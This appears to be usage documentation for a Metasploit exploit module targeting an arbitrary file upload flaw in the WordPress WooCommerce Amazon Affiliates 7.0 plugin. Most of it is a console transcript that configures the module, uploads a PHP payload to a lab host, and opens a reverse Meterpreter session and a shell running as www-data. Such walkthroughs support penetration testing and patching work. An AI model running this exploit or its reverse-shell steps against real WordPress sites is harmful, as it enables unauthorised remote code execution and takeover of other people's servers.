#### Add WordPress WooCommerce Amazon Affiliates 7.0  Upload Vulnerability.

  Application: WordPress WooCommerce Amazon Affiliates
  Homepage: http://codecanyon.net/item/woocommerce-amazon-affiliates-wordpress-plugin/3057503
  Reference: https://wpvulndb.com/vulnerabilities/7940
  
#### Vulnerable packages*
        
  7.0
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msf > use exploit/unix/webapp/wp_woocommerce_file_upload 
msf exploit(wp_woocommerce_file_upload) > show options 

Module options (exploit/unix/webapp/wp_woocommerce_file_upload):

   Name       Current Setting                   Required  Description
   ----       ---------------                   --------  -----------
   KEY        c125a47cba1e8ec73945dd622d142f79  yes       A valid key on the target host
   Proxies                                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                                        yes       The target address
   RPORT      80                                yes       The target port
   TARGETURI  /                                 yes       The base path to the wordpress application
   VHOST                                        no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   WooCommerce Amazon Affiliates 7.0


msf exploit(wp_woocommerce_file_upload) > info

       Name: WordPress WooCommerce Amazon Affiliates Upload Vulnerability
     Module: exploit/unix/webapp/wp_woocommerce_file_upload
   Platform: PHP
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-04-01

Provided by:
  Evex_1337
  Roberto Soares Espreto <robertoespreto@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   WooCommerce Amazon Affiliates 7.0

Basic options:
  Name       Current Setting                   Required  Description
  ----       ---------------                   --------  -----------
  KEY        c125a47cba1e8ec73945dd622d142f79  yes       A valid key on the target host
  Proxies                                      no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                                        yes       The target address
  RPORT      80                                yes       The target port
  TARGETURI  /                                 yes       The base path to the wordpress application
  VHOST                                        no        HTTP server virtual host

Payload information:

Description:
  This module exploits an arbitrary file upload in the WordPress 
  WooCommerce Amazon Affiliates version 7.0. It allows to upload 
  arbitrary php files and get remote code execution. This module has 
  been tested successfully on WordPress 4.2.1 on Ubuntu 14.04 Server.

References:
  https://wpvulndb.com/vulnerabilities/7940
  http://packetstormsecurity.com/files/131629/
  http://research.evex.pw/?vuln=13

msf exploit(wp_woocommerce_file_upload) > set RHOST 192.168.1.31
RHOST => 192.168.1.31
msf exploit(wp_woocommerce_file_upload) > exploit 

[*] Started reverse handler on 192.168.1.37:4444 
[+] 192.168.1.31:80 - Injecting payload...
[*] 192.168.1.31:80 - Calling payload...
[*] Sending stage (40499 bytes) to 192.168.1.31
[*] Meterpreter session 9 opened (192.168.1.37:4444 -> 192.168.1.31:41528) at 2015-05-08 02:37:07 -0300
[+] Restored original content.

meterpreter > sysinfo 
Computer    : msfdevel
OS          : Linux msfdevel 3.13.0-49-generic #81~precise1-Ubuntu SMP Wed Mar 25 16:32:40 UTC 2015 i686
Meterpreter : php/php
meterpreter > shell
Process 18718 created.
Channel 0 created.

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
